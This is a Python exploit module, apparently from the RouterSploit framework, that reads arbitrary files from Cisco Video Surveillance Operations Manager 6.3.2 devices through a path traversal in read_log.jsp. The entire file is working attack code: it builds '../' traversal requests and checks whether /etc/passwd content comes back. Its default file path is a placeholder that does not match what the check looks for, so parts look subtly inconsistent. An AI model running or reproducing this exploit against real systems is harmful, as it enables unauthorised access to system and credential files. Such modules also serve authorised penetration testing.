from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Cisco Video Surveillance Path Traversal",
        "description": "Module exploits path traversal vulnerability in Cisco Video Surveillance Operations Manager 6.3.2 devices. "
                       "If the target is vulnerable it allows to read files from the filesystem.",
        "authors": (
            "b.saleh",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/38389/",
        ),
        "devices": (
            "Cisco Video Surveillance Operations Manager 6.3.2",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    username = OptString("", "Username for logging in (optional)")
    password = OptString("", "Password for logging in (optional)")

    filename = OptString("/GH_PATH_TRAVERSAL", "File to read from the filesystem")

    def run(self):
        if self.check():
            path = "/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../..{}".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path
            )

            if response and response.status_code == 200 and len(response.text):
                # print_success("Exploit success")
                print_status("Reading file: {}".format(self.filename))
                if utils.detect_file_content(response.text, self.filename):
                    print_success(f"Exploit success. Read file {self.filename}")
                    return True
            else:
                print_error("Exploit failed - could not read file")
                return False
        else:
            print_error("Exploit failed - device seems to be not vulnerable")
            return False
        return False

    @mute
    def check(self):
        path = "/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../GH_PATH_TRAVERSAL"

        response = self.http_request(
            method="GET",
            path=path,
            auth=(self.username, self.password)
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target is vulnerable

        return False  # target is not vulnerable
